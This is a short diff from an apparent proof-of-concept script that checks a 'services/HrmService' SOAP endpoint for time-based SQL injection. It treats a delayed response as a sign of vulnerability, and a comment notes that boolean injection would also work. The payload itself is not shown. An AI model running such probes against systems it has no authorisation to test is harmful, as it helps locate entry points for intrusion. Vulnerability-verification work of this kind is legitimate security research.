@@ -30,8 +30,8 @@ def verify(url):
     </soapenv:Envelope>'''
     vurl = urllib.parse.urljoin(url, "services/HrmService")  # 使用延时判断注入点实际可以用bool进行注入
     try:
-        response = requests.post(vurl, headers=headers, data=data, timeout=10)
-        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
+        response = requests.post(vurl, headers=headers, data=data)
+        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
